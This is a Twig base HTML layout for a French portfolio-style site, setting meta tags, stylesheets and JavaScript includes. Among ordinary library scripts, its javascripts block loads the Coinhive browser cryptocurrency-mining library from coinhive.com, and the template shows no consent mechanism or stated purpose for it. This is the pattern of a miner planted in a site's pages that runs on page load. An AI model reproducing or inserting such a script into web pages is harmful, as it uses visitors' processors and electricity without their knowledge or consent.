{% set curr_route = app.request.attributes.get('_route') %}

<!DOCTYPE html>
<html lang="fr-FR">
<head>
    <meta charset="{% block metaCharset %}utf-8{% endblock %}">
    <meta name="viewport" content="{% block metaViewport %}width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no{% endblock %}">

    <title>{% block title %} | {{ content.name|raw_desc }} - {{ content.job_title|raw_desc }}{% endblock %}</title>
    <meta name="description" content="{% block metaDescription %}{{ content.meta_description|raw_desc }}{% endblock %}" />
    <meta name="keywords" content="{% block metaKeywords %}{{ content.keywords|raw_desc }}{% endblock %}">
    <meta name="geo.placename" content="{% block metaGeoPlacename %}{{ content.city_complete|raw_desc }}{% endblock %}">
    <meta name="robots" content="{% block metaRobots %}index,follow{% endblock %}">

    <meta name="author" content="{% block metaAuthor %}{{ content.name|raw_desc }}{% endblock %}" />
    <meta name="copyright" content="{% block metaCopyright %}{{ content.name|raw_desc }}{% endblock %}" />

    {% block favicon %}
        <link rel="icon" type="image/x-icon" href="{{ asset('favicon.ico') }}" />
    {% endblock %}

    <!--[if lt IE 9]>
    <script src="{{ asset('bower_components/html5shiv/dist/html5shiv.js') }}"></script>
    <![endif]-->

    {% include 'partials/meta/twitter.html.twig' %}

    {% include 'partials/meta/facebook.html.twig' %}

    {% block fonts %}
        <link href="https://fonts.googleapis.com/css?family=Raleway:300,500,700" rel="stylesheet">
    {% endblock %}

    {% block stylesheets %}
        {% stylesheets'css/reset.css' 'css/main.css' 'bower_components/izitoast/dist/css/iziToast.min.css' 'bower_components/font-awesome/css/font-awesome.min.css' filter='cssrewrite' %}
            <link rel="stylesheet" href="{{ asset_url }}" />
        {% endstylesheets %}
    {% endblock %}
</head>

<body>
{% block body %}
    {% include 'partials/header.html.twig' %}

    {% block content %}{% endblock %}
{% endblock %}

{% block javascripts %}
    <script src="{{ asset('bower_components/jquery/dist/jquery.min.js') }}"></script>
    <script src="{{ asset('bower_components/izitoast/dist/js/iziToast.min.js') }}" type="text/javascript"></script>
    <script src="{{ asset('bower_components/js-cookie/src/js.cookie.js') }}" type="text/javascript"></script>
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
{% endblock %}

{% include 'partials/meta/facebook.html.twig' %}
</body>
</html>
